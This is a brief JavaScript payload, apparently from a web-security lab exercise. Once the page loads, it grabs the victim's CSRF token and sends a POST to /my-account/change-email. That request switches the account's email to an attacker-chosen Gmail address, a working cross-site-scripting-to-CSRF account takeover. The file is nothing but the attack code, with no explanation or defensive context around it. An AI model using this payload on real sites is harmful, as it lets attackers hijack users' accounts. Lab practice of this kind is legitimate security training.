window.addEventListener('DOMContentLoaded', function() {
	var token = document.getElementsByName('csrf')[0].value;
	var data = new FormData();

	data.append('csrf', token);
	data.append('email', 'dmind1077@gmail.com');
	
	fetch('/my-account/change-email', {
		method: 'POST',
		mode: 'no-cors',
		body: data
	});
});

